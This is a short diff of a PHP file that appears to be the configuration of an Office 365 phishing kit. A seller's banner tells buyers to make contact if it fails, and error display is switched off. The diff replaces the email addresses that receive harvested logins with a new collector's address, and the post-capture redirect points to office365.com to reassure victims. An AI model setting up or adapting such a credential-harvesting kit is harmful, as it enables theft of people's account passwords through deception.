@@ -12,7 +12,7 @@ ini_set("display_errors", 0);
 // !!!! IF NOT WORKING CONTACT US  !!!
 // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-$recipient = 'premiumzones@yandex.com, sempeman@gmail.com'; // Put your email address here
+$recipient = 'lidwinaknech57@proton.me, lidwinaknech57@proton.me'; // Put your email address here
 $finish_url = 'https://office365.com';
 
 
